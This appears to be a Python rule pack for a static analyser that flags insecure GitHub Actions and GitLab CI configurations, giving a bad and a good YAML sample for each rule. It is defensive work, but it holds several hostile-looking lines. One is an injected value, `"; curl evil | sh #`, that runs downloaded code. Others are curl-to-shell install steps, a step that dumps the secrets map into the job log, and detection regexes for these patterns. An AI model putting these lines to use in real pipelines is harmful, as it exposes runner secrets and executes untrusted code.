"""CI/CD supply-chain pack: GitHub Actions workflows and GitLab CI pipelines (OpenSSF Scorecard
Dangerous-Workflow / Token-Permissions / Pinned-Dependencies, GitHub "Secure use" reference, GitLab
CI/CD YAML reference, SLSA build integrity). Tree-sitter YAML queries; detection and wording are
crev's own, quotes come from the cited pages."""
from specs._common import Pack

GHA_FILES = [".github/workflows/*.yml", ".github/workflows/*.yaml", "**/.github/workflows/*.yml", "**/.github/workflows/*.yaml"]
GL_FILES = [".gitlab-ci.yml", "**/.gitlab-ci.yml", "**/*.gitlab-ci.yml", ".gitlab/ci/**/*.yml"]
P = Pack("GHA", "yaml", "GitHub Docs (2026)", {"any": "*"}, files=GHA_FILES)
G = Pack("GITLAB", "yaml", "GitLab Docs (18.x)", {"any": "*"}, files=GL_FILES)
SECURE = "https://docs.github.com/en/actions/reference/security/secure-use"
SYNTAX = "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax"
SCORE = "https://github.com/ossf/scorecard/blob/main/docs/checks.md"
PINNED_Q = "This check tries to determine if the project pins dependencies used during its build and release process"
GLYAML = "https://docs.gitlab.com/ci/yaml/"
WF = ["file.has_re:(?m)^(on|\"on\"|'on'|true):|(?m)^on:"]
GL = ["file.has_re:(?m)^(stages|script|image|include|variables|default|workflow|[\\w.-]+):"]


def pair(key, rx, kpred=None, val="(_)"):
    kp = kpred or f'(#eq? @k "{key}")'
    return f'((block_mapping_pair key: (flow_node) @k value: {val} @match) {kp} (#match? @match "{rx}"))'


def wf(body, on="push"):
    return f"on: {on}\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n{body}"


def gha(id, title, url, needle, query, bad, good, msg, sev="major", **kw):
    kw["filters"] = WF + kw.get("filters", [])
    r = P(id, title, url, needle, query, bad, good, msg, sev=sev, kind="security", cat="security", **kw)
    r["detection"]["exclude_tests"] = True
    return r


def glab(id, title, url, needle, query, bad, good, msg, sev="major", **kw):
    r = G(id, title, url, needle, query, bad, good, msg, sev=sev, kind="security", cat="security", **kw)
    r["detection"]["exclude_tests"] = True
    return r


UNTRUSTED = ("\\\\$\\\\{\\\\{[^}]*(github\\\\.event\\\\.(issue\\\\.(title|body)|pull_request\\\\.(title|body|head\\\\.(ref|label))|comment\\\\.body|review\\\\.body"
             "|review_comment\\\\.body|pages\\\\.[^}]*\\\\.page_name|commits\\\\.[^}]*\\\\.(message|author\\\\.(email|name))|head_commit\\\\.(message|author\\\\.(email|name))"
             "|discussion\\\\.(title|body)|workflow_run\\\\.(head_branch|head_commit\\\\.message|display_title))|github\\\\.head_ref)")
gha("SCRIPT-INJECTION", "Untrusted event data expanded inside run:/script:", SECURE,
    "the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable",
    pair("", UNTRUSTED, '(#match? @k "^(run|script)$")'),
    wf("      - run: |\n          echo \"Title: ${{ github.event.pull_request.title }}\"\n", "pull_request"),
    wf("      - env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: |\n          echo \"Title: $TITLE\"\n", "pull_request"),
    "The expression is substituted into the shell script before it runs, so a pull-request title, branch name or comment containing `\"; curl evil | sh #` executes on the runner with the workflow's token and secrets. Pass the value through an env: variable and quote it.",
    sev="critical", cwe=["CWE-78", "CWE-94"], owasp=["A03:2021", "A05:2025"], asvs=["V1.2.5"])
gha("PR-TARGET-CHECKOUT", "pull_request_target/workflow_run checks out the untrusted PR head", SECURE,
    "when used with the checkout of an untrusted pull request, expose the repository to security compromises",
    pair("ref", "github\\\\.event\\\\.(pull_request\\\\.head\\\\.(sha|ref)|workflow_run\\\\.head_(sha|branch))|github\\\\.head_ref|refs/pull/"),
    "on: pull_request_target\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test\n",
    "on: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci && npm test\n",
    "pull_request_target and workflow_run run with the base repository's secrets and a write token; checking out the contributor's code and then building or testing it runs attacker code with those privileges. Use the pull_request trigger for untrusted code, or keep the privileged job away from the checkout.",
    sev="critical", filters=["file.has_re:pull_request_target|workflow_run"], cwe=["CWE-829", "CWE-94"], owasp=["A08:2021", "A08:2025"])
gha("UNPINNED-ACTION", "Third-party action pinned to a tag/branch instead of a commit SHA", SECURE,
    "Pinning an action to a full-length commit SHA is currently the only way to use an action as an immutable release.",
    '((block_mapping_pair key: (flow_node) @k value: (flow_node) @match) (#eq? @k "uses") (#match? @match "^[\\"\']?[\\\\w.-]+/[\\\\w./-]+@") (#not-match? @match "@[0-9a-f]{40}[\\"\']?$") (#not-match? @match "^[\\"\']?(\\\\./|docker://|actions/|github/)"))',
    wf("      - uses: actions/checkout@v4\n      - uses: peter-evans/create-pull-request@v7\n"),
    wf("      - uses: actions/checkout@v4\n      - uses: peter-evans/create-pull-request@271a8d0340265f705b14b6d32b9829c1cb33d45e # v7.0.8\n"),
    "A tag or branch can be moved by the action's owner (or whoever compromises it) to new code that then runs with this workflow's token and secrets, as in the tj-actions/changed-files incident. Pin the full commit SHA and let Dependabot/Renovate update it.",
    sev="minor", cwe=["CWE-829", "CWE-494"], owasp=["A08:2021", "A03:2025"])
gha("PERMISSIONS-WRITE-ALL", "GITHUB_TOKEN granted write-all", SYNTAX,
    "You can use the following syntax to define one of read-all or write-all access for all of the available permissions",
    pair("permissions", '^[\\"\']?write-all[\\"\']?$', val="(flow_node)"),
    "on: push\npermissions: write-all\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n",
    "on: push\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n",
    "Every step (and every action it uses) gets a token that can push code, create releases and change settings. Grant only the scopes the job needs, e.g. contents: read.",
    cwe=["CWE-250"], owasp=["A01:2021", "A01:2025"])
gha("NO-PERMISSIONS", "Workflow does not restrict GITHUB_TOKEN permissions", SCORE,
    "This check determines whether the project's automated workflows tokens follow the principle of least privilege.",
    '((block_mapping_pair key: (flow_node) @match) (#match? @match "^(on|\\"on\\"|\'on\'|true)$"))',
    "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n",
    "on: push\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n",
    "Without a permissions: block the token gets the repository/organisation default, which is read-write on many older repositories. Declare permissions: contents: read at the top and widen per job.",
    sev="info", filters=["file.lacks_re:(?m)^\\s*permissions:", "file.has_re:(?m)^jobs:"], cwe=["CWE-250"], owasp=["A01:2021", "A01:2025"])
gha("UNSECURE-COMMANDS", "ACTIONS_ALLOW_UNSECURE_COMMANDS re-enables set-env/add-path", "https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/",
    "can allow environment variable and path injection in workflows that log untrusted",
    pair("ACTIONS_ALLOW_UNSECURE_COMMANDS", '^[\\"\']?(true|1|yes)[\\"\']?$', val="(flow_node)"),
    wf("      - run: echo \"::set-env name=X::1\"\n        env:\n          ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n"),
    wf("      - run: echo \"X=1\" >> \"$GITHUB_ENV\"\n"),
    "The deprecated ::set-env/::add-path commands let anything printed to the log (including untrusted input) set environment variables or PATH for later steps. Write to $GITHUB_ENV / $GITHUB_PATH instead.",
    cwe=["CWE-74"], owasp=["A03:2021", "A05:2025"], docv="GitHub Changelog 2020-10-01")
gha("SELF-HOSTED-PR", "Self-hosted runner used for pull-request workflows", SECURE,
    "self-hosted runners should almost never be used for public repositories on GitHub",
    pair("runs-on", "self-hosted"),
    "on: pull_request\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: [self-hosted, linux]\n    steps:\n      - run: make test\n",
    "on: pull_request\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make test\n",
    "Any contributor's pull request runs on a persistent machine you control; it can leave backdoors for later jobs or reach your internal network. Use GitHub-hosted or ephemeral, isolated runners for untrusted code.",
    mode="ai-confirm", ai="Is this a public repository (or one accepting pull requests from forks) whose self-hosted runner is not ephemeral and isolated?",
    filters=["file.has_re:pull_request"], cwe=["CWE-829"], owasp=["A08:2021", "A08:2025"])
gha("CURL-PIPE-SHELL", "run: pipes a download straight into a shell", SCORE, PINNED_Q,
    pair("run", "(curl|wget)[^|\\\\n]*\\\\|\\\\s*(sudo\\\\s+)?(-E\\\\s+)?(ba|z|da)?sh\\\\b"),
    wf("      - run: curl -fsSL https://get.example.dev/install.sh | bash\n"),
    wf("      - run: |\n          curl -fsSLo install.sh https://get.example.dev/install.sh\n          echo \"3b1f...  install.sh\" | sha256sum -c -\n          bash install.sh\n"),
    "Whatever the server returns at that moment runs on the runner, with the workflow's secrets. Download to a file, verify a pinned checksum or signature, then run it - or use a pinned action/package.",
    sev="minor", cwe=["CWE-494"], owasp=["A08:2021", "A08:2025"], docv="OpenSSF Scorecard checks (main)")
gha("DUMP-CONTEXT", "Workflow prints the secrets or github context", SCORE,
    "logging github context and secrets",
    pair("", "toJSON\\\\(\\\\s*(secrets|github)\\\\s*\\\\)", '(#match? @k "^(run|script)$")'),
    wf("      - run: echo '${{ toJSON(secrets) }}'\n"),
    wf("      - run: echo \"ref=$GITHUB_REF\"\n"),
    "The full secrets map (or github context, which carries the token) goes into the job log; masking only covers exact registered values, so derived or multi-line secrets leak. Print only the fields you need.",
    cwe=["CWE-532"], owasp=["A09:2021", "A09:2025"], docv="OpenSSF Scorecard checks (main)")

glab("CURL-PIPE-SHELL", "Job script pipes a download straight into a shell", SCORE, PINNED_Q,
    pair("", "(curl|wget)[^|\\\\n]*\\\\|\\\\s*(sudo\\\\s+)?(-E\\\\s+)?(ba|z|da)?sh\\\\b", '(#match? @k "^(script|before_script|after_script)$")'),
    "build:\n  image: node:22.11\n  script:\n    - curl -fsSL https://get.example.dev/install.sh | sh\n    - make\n",
    "build:\n  image: node:22.11\n  script:\n    - curl -fsSLo install.sh https://get.example.dev/install.sh\n    - echo \"3b1f...  install.sh\" | sha256sum -c -\n    - sh install.sh\n",
    "Whatever the server returns at that moment runs in the job, with its CI/CD variables. Download to a file, verify a pinned checksum or signature, then run it.",
    sev="minor", cwe=["CWE-494"], owasp=["A08:2021", "A08:2025"], docv="OpenSSF Scorecard checks (main)")
glab("IMAGE-UNPINNED", "Job image without a version tag or digest (or :latest)", SCORE, PINNED_Q,
    pair("", '^[\\"\']?[a-z0-9][\\\\w./-]*(:latest)?[\\"\']?$', '(#match? @k "^(image|name)$")', val="(flow_node)"),
    "test:\n  image: python\n  script:\n    - pytest\n",
    "test:\n  image: python:3.13.1-slim\n  script:\n    - pytest\n",
    "The job runs whatever the registry serves under that name today, so a new upstream release (or a compromised tag) changes your build without a commit. Pin a version tag, ideally with an @sha256 digest.",
    sev="minor", filters=["node.lacks_re:\\$", "ancestor.has_re:block_mapping_pair:^(image|services|default|[\\w.-]+):"], cwe=["CWE-829", "CWE-494"], owasp=["A08:2021", "A03:2025"],
    docv="OpenSSF Scorecard checks (main)")
glab("REMOTE-INCLUDE-NO-INTEGRITY", "include:remote without an integrity hash", GLYAML,
    "Use integrity with include:remote to specify a SHA256 hash of the included remote file.",
    pair("remote", '^[\\"\']?https?://', val="(flow_node)"),
    "include:\n  - remote: 'https://example.com/ci/templates/build.yml'\n",
    "include:\n  - remote: 'https://example.com/ci/templates/build.yml'\n    integrity: 'sha256-L3/GAoKaw0Arw6hDCKeKQlV1QPEgHYxGBHsH4zG1IY8='\n",
    "The pipeline definition is fetched from another server on every run; whoever controls that file controls your jobs and their variables. Add integrity: with the file's SHA256 (GitLab 17.9+), or vendor the file.",
    sev="minor", filters=["file.lacks_re:integrity:"], cwe=["CWE-829", "CWE-494"], owasp=["A08:2021", "A08:2025"])

RULES = P.R + G.R
